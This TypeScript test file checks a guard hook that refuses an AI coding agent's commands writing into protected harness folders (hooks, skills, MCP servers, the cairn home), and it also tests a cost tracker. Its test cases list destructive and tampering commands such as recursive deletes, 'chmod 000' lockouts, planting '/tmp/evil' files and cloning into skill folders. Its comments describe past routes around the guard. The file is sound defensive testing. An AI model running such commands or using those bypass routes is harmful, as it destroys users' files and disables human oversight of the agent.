      "rm -rf ~/srv/dir*",
      "chmod -R 000 ~/srv2",
      "find ~/srv -name index.js -delete",
      "find ~/mcp -name '*.py' -exec cp /tmp/evil {} \\;",
      "tar -xf /tmp/evil.tar -C ~/mcp/weather2",
      "cd ~/srv2 && echo x > dist/index.js",
      "mv /tmp/evil ~/mcp/new", // the folder a config names before it exists
      "echo x > ~/mcp/new/weather.py",
    ]) {
      const r = run(p, home, "Bash", { command: c });
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain(DIR_WHAT);
    }
  });

  it("only the folder the config names: its parents' other files, a folder argument, in-project folders and reads pass", () => {
    const { p, home } = fixture();
    for (const c of [
      "echo x > ~/mcp/README.md", // beside the named folder, in its parent
      "mkdir -p ~/mcp/other && echo x > ~/mcp/other/weather.py",
      "echo x > ~/srv/notes.md", // beside node's folder
      "echo x > ~/srv/data/package.json", // a folder the server is handed, not one it runs
      "rm -rf ~/srv/data",
      "echo x > ~/notes.txt", // the cwd `~` holds the home: never a zone
      "echo x > ~/server.js",
      "echo x > py/tool.py", // uv --directory into the project
      "echo x > server/dist/index.js", // the project's own server, from its cwd
      "rm -rf server/dist && mkdir -p server/dist",
      "cat ~/mcp/weather/weather.py",
      "ls -la ~/srv/dirmain",
      "grep -rn x ~/srv2",
      "uv --directory ~/mcp/weather run weather.py",
      "node ~/srv/dirmain",
      "cp ~/srv2/dist/index.js /tmp/index.js.bak",
    ]) {
      expect(run(p, home, "Bash", { command: c }).status, c).toBe(0);
    }
    for (const file of [join(home, "mcp", "README.md"), join(home, "srv", "notes.md"), join(home, "srv", "data", "package.json"),
      join(home, "notes.txt"), join(p, "py", "tool.py"), join(p, "server", "dist", "index.js")]) {
      expect(run(p, home, "Write", { file_path: file }).status, file).toBe(0);
    }
    expect(run(p, home, `${DC}read_file`, { path: "~/mcp/weather/weather.py" }).status).toBe(0);
    expect(run(p, home, `${DC}list_directory`, { path: join(home, "srv", "dirmain") }).status).toBe(0);
  });
});

// #317: #309 protected the skill, agent and command folders against Write,
// mkdir and cp, but a command that plants a whole tree at a path wasn't
// read: `git clone URL .claude/skills/x` passed and planted a skill -- or
// a plugin carrying its own hooks and MCP servers -- under a protected
// folder, the install line a skill README carries. Each tree-creating
// command is judged like a mkdir of where it lands now: git clone,
// worktree add, submodule add and init; gh repo clone and fork --clone;
// npx degit; and the create-* initializers. One landing elsewhere passes.
describe("harness guard refuses tree-creating commands into protected folders (#317)", () => {
  const URL = "https://example.invalid/o/skill.git";

  /** A home with each protected folder and a repos/ beside them; a project with its own skills/ and src/. */
  function fixture() {
    const p = freshDir("cairn-hooks-tree-proj-");
    const home = freshDir("cairn-hooks-tree-home-");
    for (const d of [join(home, ".claude", "skills"), join(home, ".claude", "agents"), join(home, ".claude", "commands"),
      join(home, ".claude", "hooks"), join(home, "repos"), join(p, ".claude", "skills"), join(p, "src")]) {
      mkdirSync(d, { recursive: true });
    }
    return { p, home };
  }

  /** Exit status and stderr for one Bash line, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, command: string) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: p }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  it("refuses each tree command into a protected folder, by path, by cwd or by the repo's own name, naming the folder", () => {
    const { p, home } = fixture();
    const cases: Array<[command: string, phrase: string]> = [
      [`git clone ${URL} ~/.claude/skills/x`, "your machine-wide skills"],
      [`git clone --depth 1 ${URL} $HOME/.claude/agents`, "your machine-wide agent definitions"],
      [`cd ~/.claude/skills && git clone ${URL}`, "your machine-wide skills"], // lands in skill/, here
      [`cd ~/.claude/commands && git clone ${URL} .`, "your machine-wide slash commands"],
      ["git worktree add ~/.claude/agents/x", "your machine-wide agent definitions"],
      [`git submodule add ${URL} ~/.claude/skills/x`, "your machine-wide skills"],
      ["git init ~/.claude/hooks/x", "your machine-wide Claude hooks"],
      ["cd ~/.claude/skills && git init", "your machine-wide skills"],
      ["gh repo clone o/skill ~/.claude/skills/x", "your machine-wide skills"],
      ["cd ~/.claude/skills && gh repo clone o/skill", "your machine-wide skills"],
      ["cd ~/.claude/skills && gh repo fork o/skill --clone", "your machine-wide skills"],
      ["npx degit user/repo ~/.claude/skills/x", "your machine-wide skills"],
      ["cd ~/.claude/commands && npx degit user/repo", "your machine-wide slash commands"],
      ["npx create-skill ~/.claude/skills/x", "your machine-wide skills"],
      ["npm create vite ~/.claude/skills/x", "your machine-wide skills"],
      ["yarn create skill $HOME/.claude/agents/x", "your machine-wide agent definitions"],
      ["cd ~/.claude/skills && npm init -y", "your machine-wide skills"], // a package.json there
      [`git clone ${URL} .claude/skills/x`, "the project's skills"],
      [`cd .claude/skills && git clone ${URL}`, "the project's skills"],
      [`git clone ${URL} hooks/x`, "the hook directory"],
      ["git clone git@example.invalid:o/hooks.git", "the hook directory"], // named by the repo
    ];
    for (const [c, phrase] of cases) {
      const r = run(p, home, c);
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain(phrase);
      expect(r.stderr, c).toContain("owner's go-ahead");
      expect(r.stderr, c).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
    }
  });

  it("clones and scaffolds elsewhere, their listings, and gh's other commands stay ordinary work", () => {
    const { p, home } = fixture();
    for (const c of [
      `git clone ${URL} ~/repos/skill`,
      `git clone ${URL} /tmp/skill`,
      `cd ~/repos && git clone ${URL}`,
      `git clone ${URL}`, // skill/ at the project root
      `git clone ${URL} src/skill`,
      "git worktree add ../wt",
      "git worktree add ~/repos/wt -b feat",
      "git worktree list",
      `git submodule add ${URL} vendor/skill`,
      "git submodule update --init --recursive",
      "git init",
      "git init ~/repos/new",
      "git init src/new",
      "gh repo clone o/r /tmp/x",
      "gh repo clone o/r",
      "cd ~/repos && gh repo fork o/r --clone",
      "gh repo fork o/r",
      "gh repo view o/r",
      `gh pr create --body "git clone ${URL} .claude/skills/x"`,
      "npx degit user/repo new-app",
      "npx degit user/repo ~/repos/app",
      "npx create-vite my-app",
      "npm create vite ~/repos/app",
      "npm init -y",
      "npm init vite@latest app -- --template react",
      "yarn create vite app",
      "bun create vite app",
      "ls ~/.claude/skills",
      "git clone --help",
    ]) {
      expect(run(p, home, c).status, c).toBe(0);
    }
  });
});

// #318: gitTargets resolved a `-C` folder literally, so `git -C ~/proj rm
// -r hooks` landed every operand under a folder named `~` and the anchored
// hooks/ and .mcp.json rules never matched -- while the plain, `-C .`,
// `-C /abs` and `cd ~/proj &&` spellings were refused. The -C value is
// read like a cd target now (dirTarget): ~, ~+, $HOME, ${HOME} and $PWD
// spelled out, a variable the guard can't read LOST, so a relative operand
// from it is refused the way a write after an unfollowable cd is. tar's -C
// was read the same literal way and is fixed alongside.
describe("harness guard reads a git -C folder like a cd target (#318)", () => {
  const URL = "https://example.invalid/o/skill.git";

  /** A home with the project under it, so ~/proj, $HOME/proj and $PWD all name the project. */
  function fixture() {
    const home = freshDir("cairn-hooks-gitc-home-");
    const p = join(home, "proj");
    for (const d of [join(p, "hooks"), join(p, "src")]) mkdirSync(d, { recursive: true });
    writeFileSync(join(p, "hooks", "hooks.json"), "{}\n");
    writeFileSync(join(p, ".mcp.json"), "{}\n");
    writeFileSync(join(p, "src", "old.txt"), "old\n");
    return { p, home };
  }

  /** Exit status and stderr for one Bash line from the project, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, command: string) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT", "FOO"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: p }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  const SPELLINGS = ["~/proj", "~/proj/", "$HOME/proj", "${HOME}/proj", '"${HOME}/proj"', '"$PWD"', "$PWD", "~+"];
  const WRITES: Array<[tail: string, phrase: string]> = [
    ["rm -r hooks", "the hook directory"],
    ["rm .mcp.json", "the MCP server config"],
    ["checkout HEAD~1 -- hooks/hooks.json", "the hook directory"],
    ["restore --source HEAD~1 hooks/hooks.json", "the hook directory"],
    ["mv src hooks", "the hook directory"],
    [`clone ${URL} hooks/x`, "the hook directory"],
    ["worktree add hooks/x", "the hook directory"],
    ["init hooks/x", "the hook directory"],
    [`submodule add ${URL} hooks/x`, "the hook directory"],
  ];

  for (const dir of SPELLINGS) {
    it(`refuses each write through \`git -C ${dir}\`, naming the protected thing`, () => {
      const { p, home } = fixture();
      for (const [tail, phrase] of WRITES) {
        const c = `git -C ${dir} ${tail}`;
        const r = run(p, home, c);
        expect(r.status, c).toBe(2);
        expect(r.stderr, c).toContain(phrase);
        expect(r.stderr, c).toContain("owner's go-ahead");
        expect(r.stderr, c).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
      }
    });
  }

  it("keeps refusing the plain, -C ., -C /abs, cd ~/proj, chained -C and env -C spellings", () => {
    const { p, home } = fixture();
    for (const c of [
      "git rm -r hooks",
      "git -C . rm -r hooks",
      `git -C ${p} rm -r hooks`,
      "cd ~/proj && git rm -r hooks",
      "git -C ~ -C proj rm -r hooks", // a later -C is relative to the one before
      "git -C ~/proj -C . rm -r hooks",
      'env -C /tmp git -C "$PWD" rm -r hooks', // $PWD is the shell's folder, not env -C's
    ]) {
      const r = run(p, home, c);
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain("the hook directory");
    }
  });

  it("refuses a relative operand from a -C folder it can't read, saying so", () => {
    const { p, home } = fixture();
    for (const c of [
      'git -C "$FOO" rm -r hooks',
      "git -C $FOO rm -r hooks",
      'git -C "$(pwd)" rm -r hooks',
      "git -C ~someone/proj rm -r hooks",
      'git -C "$FOO" checkout HEAD~1 -- hooks/hooks.json',
    ]) {
      const r = run(p, home, c);
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain("couldn't tell");
    }
  });

  it("lets ordinary work through the same spellings pass", () => {
    const { p, home } = fixture();
    for (const c of [
      "git -C ~/proj rm src/old.txt",
      "git -C ~/proj status",
      "git -C $HOME/proj log --oneline",
      'git -C "${HOME}/proj" diff',
      'git -C "$PWD" mv src/old.txt src/new.txt',
      "git -C ~+ checkout -- src/old.txt",
      `git -C ~/proj clone ${URL} src/skill`,
      'git -C "$FOO" status', // nothing written, so the lost folder never matters
    ]) {
      expect(run(p, home, c).status, c).toBe(0);
    }
  });

  it("reads tar's -C the same way", () => {
    const { p, home } = fixture();
    for (const c of ["tar xf /tmp/a.tar -C ~/proj hooks/hooks.json", "tar -xf /tmp/a.tar -C $HOME/proj hooks/hooks.json"]) {
      const r = run(p, home, c);
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain("the hook directory");
    }
    const lost = run(p, home, 'tar xf /tmp/a.tar -C "$FOO" hooks/hooks.json');
    expect(lost.status).toBe(2);
    expect(lost.stderr).toContain("couldn't tell");
    for (const c of ["tar xf /tmp/a.tar -C ~/proj src/x.txt", "tar tf /tmp/a.tar -C ~/proj"]) {
      expect(run(p, home, c).status, c).toBe(0);
    }
  });
});

// #299: the holder rule ran only for removal, so `chmod 000` on the cairn
// home (~/@cairn or CAIRN_HOME) passed -- and the run guard, unable to read
// the stamp or the run list, then let an unshipped push through. Changing
// the mode, owner, flags or ACL of a folder holding a protected place is
// refused now, through every write shape; the same change to an unrelated
// folder, or to the run report, still passes.
describe("harness guard keeps the cairn home's mode and owner (#299)", () => {
  // `@cairn` is the cairn home folder, spelled apart for the commit leak guard (see #263 above).
  const sh = (s: string) => s.replaceAll("@cairn", ".cairn");
  const bash = (command: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command: sh(command) }, cwd: "" });

  /** A project, a home and a separate CAIRN_HOME, each cairn home holding a stamp, a manifest and a report. */
  function fixture() {
    const p = freshDir("cairn-hooks-perm-proj-");
    const home = freshDir("cairn-hooks-perm-home-");
    const cairnHome = freshDir("cairn-hooks-perm-cairnhome-");
    for (const base of [join(home, ".cairn"), cairnHome]) {
      mkdirSync(join(base, "ship-gate"), { recursive: true });
      mkdirSync(join(base, "runs"), { recursive: true });
      mkdirSync(join(base, "handoff"), { recursive: true });
      writeFileSync(join(base, "ship-gate", "proj-0123456789abcdef.json"), "{}");
      writeFileSync(join(base, "runs", "r1.json"), "{}");
      writeFileSync(join(base, "runs", "r1-report.md"), "# run\n");
    }
    return { p, home, cairnHome, env: { HOME: home, CAIRN_HOME: cairnHome } };
  }

  it("refuses a mode, owner, flags or ACL change to the cairn home or a folder above it", () => {
    const { p, home, cairnHome, env } = fixture();
    writeFileSync(join(p, "acl.txt"), `# file: ${join(home, ".cairn")}\n# owner: nobody\nuser::---\n`);
    for (const c of [
      "chmod 000 ~/@cairn",
      "chmod -R 000 ~/@cairn",
      "chmod 000 $CAIRN_HOME",
      `chmod 000 ${cairnHome}`,
      "chmod 000 ~",
      "chown -R nobody ~/@cairn",
      "chgrp -R wheel $CAIRN_HOME",
      "chflags uchg ~/@cairn",
      "chattr +i ~/@cairn",
      "setfacl -m u:nobody:--- ~/@cairn",
      "setfacl --restore=acl.txt",
      "chmod +a 'everyone deny list' ~/@cairn",
      "xattr -w com.example.lock 1 ~/@cairn",
      "xattr -c $CAIRN_HOME",
      "sudo chmod 000 ~/@cairn",
      "cd ~ && chmod 000 @cairn",
      "echo ~/@cairn | xargs chmod 000",
      "echo $CAIRN_HOME | xargs chown nobody",
      "find ~ -maxdepth 1 -name @cairn -exec chmod 000 {} +",
      "find ~ -maxdepth 1 -name @cairn | xargs chmod 000",
      "install -d -m 000 ~/@cairn",
      "chmod 000 ~/.ca*",
      "chmod 000 ~/.CAIRN",
    ]) {
      const r = runHookRaw(HARNESSGUARD, p, bash(c), env);
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toMatch(/folder holding|ship-gate stamp|run manifests/);
    }
  });

  it("the same changes to an unrelated folder, the run report or a plain listing pass", () => {
    const { p, env } = fixture();
    writeFileSync(join(p, "acl.txt"), "# file: /tmp/unrelated\n# owner: nobody\nuser::rwx\n");
    for (const c of [
      "chmod 755 build",
      "chmod -R u+w build",
      "chmod +x scripts/run.sh",
      "chmod 700 ~/.ssh",
      "chown -R nobody /tmp/unrelated",
      "chmod 600 ~/@cairn/runs/r1-report.md",
      "chmod 755 ~/@cairn/handoff",
      "find ~/@cairn/handoff -type f -exec chmod 644 {} +",
      "setfacl --restore=acl.txt",
      "xattr -l ~/@cairn",
      "xattr -p com.apple.quarantine $CAIRN_HOME",
      "ls -ld ~/@cairn && stat $CAIRN_HOME",
      "install -d ~/@cairn/handoff",
      "mkdir -p ~/@cairn",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bash(c), env).status, c).toBe(0);
    }
  });

  it("the project folder and the folders above it count as holders too", () => {
    const { p, env } = fixture();
    for (const [locked, ordinary] of [
      ["chmod -R 000 .", "chmod -R 755 build"],
      ["chown -R nobody ..", "chown -R nobody dist"],
      ["chmod 000 ../*", "chmod 644 ./*.md"],
      ["chflags -R uchg .", "chflags -R nouchg build"],
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bash(locked), env).status, locked).toBe(2);
      expect(runHookRaw(HARNESSGUARD, p, bash(ordinary), env).status, ordinary).toBe(0);
    }
  });
});

describe("stop-costtracker + cost-report", () => {
  const COSTTRACKER = join(scriptsDir, "stop-costtracker.mjs");
  const COSTREPORT = join(scriptsDir, "cost-report.mjs");

  function metricsPathFor(projectDir: string): string {
    const { base, hash } = hashAndBaseForEnvDir(projectDir);
    return join(process.env.HOME ?? "", ".cairn", "metrics", `${base}-${hash}.jsonl`);
  }

  function transcriptWith(dir: string): string {
    const lines = [
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-4-8",
        usage: { input_tokens: 1000, output_tokens: 2000, cache_creation_input_tokens: 500, cache_read_input_tokens: 10000 } } }),
      JSON.stringify({ type: "user", message: { content: "hi" } }),
      JSON.stringify({ type: "assistant", message: { model: "claude-sonnet-5",
        usage: { input_tokens: 4000, output_tokens: 1000 } } }),
    ];
    const p = join(dir, "transcript.jsonl");
    writeFileSync(p, lines.join("\n") + "\n");
    return p;
  }

  it("writes a snapshot row tagged with the active phase/issue; report rolls it up", () => {
    const proj = freshDir("cairn-cost-");
    mkdirSync(join(proj, ".cairn", "state"), { recursive: true });
    writeFileSync(join(proj, ".cairn", "state", "active-context.json"),
      JSON.stringify({ phase: 4, issueId: "CRN-99" }));
    const transcript = transcriptWith(proj);
    const metrics = metricsPathFor(proj);
    rmSync(metrics, { force: true });

    const r = runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s1", transcript_path: transcript }));
    expect(r.status).toBe(0);
    const rows = readFileSync(metrics, "utf8").trim().split("\n").map((l) => JSON.parse(l));
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ session_id: "s1", phase: 4, issue: "CRN-99", kind: "issue" });
    expect(rows[0].input_tokens).toBe(5000);
    expect(rows[0].output_tokens).toBe(3000);
    expect(rows[0].est_cost_usd).toBeGreaterThan(0);
    expect(rows[0].models).toContain("claude-opus-4-8");

    // throttled second run -- still one row
    const r2 = runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s1", transcript_path: transcript }));
    expect(r2.status).toBe(0);
    expect(readFileSync(metrics, "utf8").trim().split("\n")).toHaveLength(1);

    // report: per-issue roll-up returns a positive number
    const rep = spawnSync(process.execPath, [COSTREPORT, "--issue", "CRN-99"], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    expect(Number(rep.stdout.trim())).toBeGreaterThan(0);
    rmSync(metrics, { force: true });
  });

  it("tags non-issue work by its open session kind, and bare-phase work as plan (#92)", () => {
    const proj = freshDir("cairn-cost-kind-");
    mkdirSync(join(proj, ".cairn", "state"), { recursive: true });
    writeFileSync(join(proj, ".cairn", "state", "active-context.json"),
      JSON.stringify({ phase: 4 }));
    mkdirSync(join(proj, ".cairn", "probe"), { recursive: true });
    writeFileSync(join(proj, ".cairn", "probe", "probe-abc123.md"), "# open probe\n");
    const transcript = transcriptWith(proj);
    const metrics = metricsPathFor(proj);
    rmSync(metrics, { force: true });

    const r = runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s-probe", transcript_path: transcript }));
    expect(r.status).toBe(0);
    let rows = readFileSync(metrics, "utf8").trim().split("\n").map((l) => JSON.parse(l));
    expect(rows[0].kind).toBe("probe");

    // no open sessions, phase only -> plan
    rmSync(join(proj, ".cairn", "probe"), { recursive: true, force: true });
    rmSync(metrics, { force: true });
    const r2 = runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s-plan", transcript_path: transcript }));
    expect(r2.status).toBe(0);
    rows = readFileSync(metrics, "utf8").trim().split("\n").map((l) => JSON.parse(l));
    expect(rows[0].kind).toBe("plan");
    rmSync(metrics, { force: true });
  });

  it("is a silent no-op on a missing transcript or empty payload", () => {
    const proj = freshDir("cairn-cost-");
    const metrics = metricsPathFor(proj);
    rmSync(metrics, { force: true });
    expect(runHookRaw(COSTTRACKER, proj, "{}").status).toBe(0);
    expect(runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s", transcript_path: join(proj, "nope.jsonl") })).status).toBe(0);
    expect(existsSync(metrics)).toBe(false);
  });

  // #176 -- report bytes. A fan-out reports back two ways: the tool_result
  // answering a Task/Agent call, and the <task-notification> an async agent's
  // result arrives on. Both are real coordinator context; the async pair is
  // ONE subagent, not two, and the queue-operation echo is not context at all.
  const LAUNCH = "Async agent launched";     // the tool_result of an async call
  const SYNC_REPORT = "a synchronous subagent's whole report";
  const NOTIFICATION = [
    "<task-notification>",
    "<task-id>task-one</task-id>",
    "<tool-use-id>toolu_async</tool-use-id>",
    "<status>completed</status>",
    "<result>the async subagent's whole report</result>",
    "</task-notification>",
  ].join("\n");

  function transcriptWithReports(dir: string): string {
    const lines = [
      // async fan-out: Agent call, its launch blob, then the notification
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-4-8",
        usage: { input_tokens: 1000, output_tokens: 2000, cache_read_input_tokens: 4000 },
        content: [{ type: "tool_use", id: "toolu_async", name: "Agent" }] } }),
      JSON.stringify({ type: "user", message: { content: [
        { type: "tool_result", tool_use_id: "toolu_async", content: [{ type: "text", text: LAUNCH }] }] } }),
      // the enqueue echo of the same notification -- never enters the context
      JSON.stringify({ type: "queue-operation", operation: "enqueue", content: NOTIFICATION }),
      JSON.stringify({ type: "user", message: { content: NOTIFICATION } }),
      // synchronous fan-out: one Task call, one tool_result, no notification
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-4-8",
        usage: { input_tokens: 500, output_tokens: 100 },
        content: [{ type: "tool_use", id: "toolu_sync", name: "Task" }] } }),
      JSON.stringify({ type: "user", message: { content: [
        { type: "tool_result", tool_use_id: "toolu_sync", content: SYNC_REPORT }] } }),
      // a plain tool_result from an ordinary tool -- not a report
      JSON.stringify({ type: "assistant", message: { model: "claude-opus-4-8",
        usage: { input_tokens: 10, output_tokens: 10 },
        content: [{ type: "tool_use", id: "toolu_bash", name: "Bash" }] } }),
      JSON.stringify({ type: "user", message: { content: [
        { type: "tool_result", tool_use_id: "toolu_bash", content: "x".repeat(4096) }] } }),
    ];
    const p = join(dir, "reports.jsonl");
    writeFileSync(p, lines.join("\n") + "\n");
    return p;
  }

  it("attributes coordinator input growth to task-result injections (#176)", () => {
    const proj = freshDir("cairn-cost-reports-");
    mkdirSync(join(proj, ".cairn", "state"), { recursive: true });
    writeFileSync(join(proj, ".cairn", "state", "active-context.json"),
      JSON.stringify({ phase: 24, issueId: "CRN-176" }));
    const transcript = transcriptWithReports(proj);
    const metrics = metricsPathFor(proj);
    rmSync(metrics, { force: true });

    expect(runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s-fan", transcript_path: transcript })).status).toBe(0);
    const row = JSON.parse(readFileSync(metrics, "utf8").trim().split("\n")[0]);

    const expected = Buffer.byteLength(LAUNCH) + Buffer.byteLength(NOTIFICATION)
      + Buffer.byteLength(SYNC_REPORT);
    expect(row.report_bytes).toBe(expected);
    // launch blob + notification + sync result; the Bash result is not a report
    expect(row.report_count).toBe(3);
    // the async pair is ONE subagent, plus the synchronous one
    expect(row.report_tasks).toBe(2);

    // the report renders it, and --json exposes it with a share of fresh input
    const human = spawnSync(process.execPath, [COSTREPORT], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    expect(human.stdout).toContain("task reports:");
    expect(human.stdout).toContain("from 2 subagents");

    const json = spawnSync(process.execPath, [COSTREPORT, "--json"], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    const parsed = JSON.parse(json.stdout);
    expect(parsed.reports).toMatchObject({ bytes: expected, injections: 3, tasks: 2 });
    // peak context is one request's own input, not the token sums: the busiest
    // turn carried 1000 fresh + 4000 replayed, so 5000 -- never 1510 or 15510.
    expect(parsed.reports.context_peak_tokens).toBe(5000);
    expect(parsed.reports.share_pct).toBeGreaterThan(0);

    const per = spawnSync(process.execPath, [COSTREPORT, "--reports"], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    expect(per.stdout).toContain("s-fan");
    expect(per.stdout).toContain("CRN-176");
    rmSync(metrics, { force: true });
  });

  it("records zero report bytes for a session that never fanned out", () => {
    const proj = freshDir("cairn-cost-noreports-");
    const transcript = transcriptWith(proj);
    const metrics = metricsPathFor(proj);
    rmSync(metrics, { force: true });

    expect(runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s-solo", transcript_path: transcript })).status).toBe(0);
    const row = JSON.parse(readFileSync(metrics, "utf8").trim().split("\n")[0]);
    expect(row).toMatchObject({ report_bytes: 0, report_count: 0, report_tasks: 0 });
    expect(row.context_peak_tokens).toBe(11500); // 1000 + 500 cache-write + 10000 cache-read

    // nothing to render -- the section stays out of the way
    const human = spawnSync(process.execPath, [COSTREPORT], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    expect(human.stdout).not.toContain("task reports:");
    const per = spawnSync(process.execPath, [COSTREPORT, "--reports"], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    expect(per.stdout.trim()).toBe("no task-result injections recorded yet.");
    rmSync(metrics, { force: true });
  });

  // #229 -- the log SEGMENTS, it does not truncate. The old cap kept the last
  // 2500 of 5000 lines, deleting exactly the samples the token estimator
  // calibrates from, and fastest on the busiest projects.
  function segmentDir(projectDir: string): { dir: string; stem: string } {
    const p = metricsPathFor(projectDir);
    return { dir: dirname(p), stem: basename(p).replace(/\.jsonl$/, "") };
  }

  /** Closed segments beside the live one, oldest first. */
  function closedSegments(projectDir: string): string[] {
    const { dir, stem } = segmentDir(projectDir);
    try {
      return readdirSync(dir)
        .filter((n) => n !== `${stem}.jsonl` && n.startsWith(`${stem}.`) && n.endsWith(".jsonl"))
        .sort();
    } catch {
      return [];
    }
  }

  /** Metrics live under the real $HOME, so every test here cleans its own
   *  stem -- live segment and closed ones alike -- or the next one inherits
   *  rows it never wrote. */
  function clearMetrics(projectDir: string): void {
    const { dir, stem } = segmentDir(projectDir);
    rmSync(join(dir, `${stem}.jsonl`), { force: true });
    for (const n of closedSegments(projectDir)) rmSync(join(dir, n), { force: true });
  }

  function rows(...entries: Record<string, unknown>[]): string {
    return entries.map((e) => JSON.stringify(e)).join("\n") + "\n";
  }

  /** A live segment already at the roll-over threshold, aged past the hook's
   *  30s throttle so the next run actually does work. */
  function fillLiveSegment(projectDir: string, count: number, ts: string): string {
    const metrics = metricsPathFor(projectDir);
    mkdirSync(dirname(metrics), { recursive: true });
    const lines: string[] = [];
    for (let i = 0; i < count; i++) {
      lines.push(JSON.stringify({
        ts, session_id: `bulk-${i}`, phase: 1,
        input_tokens: 10, output_tokens: 1, est_cost_usd: 0.01,
      }));
    }
    writeFileSync(metrics, lines.join("\n") + "\n");
    const aged = new Date(Date.now() - 120_000);
    utimesSync(metrics, aged, aged);
    return metrics;
  }

  it("closes a full segment by renaming it -- no row is ever dropped (#229)", () => {
    const proj = freshDir("cairn-cost-rotate-");
    clearMetrics(proj);
    const transcript = transcriptWith(proj);
    // recent rows: still-live sessions, so nothing is prunable either
    const metrics = fillLiveSegment(proj, 5000, new Date().toISOString());

    expect(runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s-fresh", transcript_path: transcript })).status).toBe(0);

    // the live segment holds the new row alone...
    const live = readFileSync(metrics, "utf8").trim().split("\n");
    expect(live).toHaveLength(1);
    expect(JSON.parse(live[0]).session_id).toBe("s-fresh");

    // ...and every one of the 5000 prior rows is intact in a dated segment
    const closed = closedSegments(proj);
    expect(closed).toHaveLength(1);
    expect(closed[0]).toMatch(/\.\d{8}-\d{6}-\d{2}\.jsonl$/);
    const kept = readFileSync(join(dirname(metrics), closed[0]), "utf8").trim().split("\n");
    expect(kept).toHaveLength(5000);
    expect(JSON.parse(kept[0]).session_id).toBe("bulk-0");
    expect(JSON.parse(kept[4999]).session_id).toBe("bulk-4999");

    // and the report sees the whole record, not just the live segment
    const json = spawnSync(process.execPath, [COSTREPORT, "--json"], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    expect(JSON.parse(json.stdout).sessions).toBe(5001);
    clearMetrics(proj);
  });

  it("merges segments to the LATEST row per session, never the sum (#229)", () => {
    const proj = freshDir("cairn-cost-merge-");
    clearMetrics(proj);
    const metrics = metricsPathFor(proj);
    const { dir, stem } = segmentDir(proj);
    mkdirSync(dir, { recursive: true });

    // s1 started before the roll-over: its early CUMULATIVE row sits in the
    // closed segment. s2 lived and died entirely inside it.
    writeFileSync(join(dir, `${stem}.20250101-000000-00.jsonl`), rows(
      { ts: "2025-01-01T00:00:00.000Z", session_id: "s1", phase: 4, issue: "CRN-1",
        input_tokens: 100, output_tokens: 10, est_cost_usd: 1 },
      { ts: "2025-01-01T00:00:01.000Z", session_id: "s2", phase: 4, issue: "CRN-1",
        input_tokens: 50, output_tokens: 5, est_cost_usd: 0.5 },
    ));
    // days later s1 gets another row -- cumulative, so it SUPERSEDES the first
    writeFileSync(metrics, rows(
      { ts: "2025-01-09T00:00:00.000Z", session_id: "s1", phase: 4, issue: "CRN-1",
        input_tokens: 300, output_tokens: 30, est_cost_usd: 3 },
    ));

    const json = spawnSync(process.execPath, [COSTREPORT, "--json"], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    const parsed = JSON.parse(json.stdout);
    expect(parsed.sessions).toBe(2);
    // 3.00 (s1's latest) + 0.50 (s2) -- NOT 4.50, which is what concatenating
    // the segments and summing would produce.
    expect(parsed.total_est_usd).toBe(3.5);

    const perIssue = spawnSync(process.execPath, [COSTREPORT, "--issue", "CRN-1"], {
      cwd: proj, env: { ...process.env, CLAUDE_PROJECT_DIR: proj }, encoding: "utf8",
    });
    expect(perIssue.stdout.trim()).toBe("3.50");
    clearMetrics(proj);
  });

  it("prunes a closed segment only once its sessions are quiescent (#229)", () => {
    const proj = freshDir("cairn-cost-prune-");
    clearMetrics(proj);
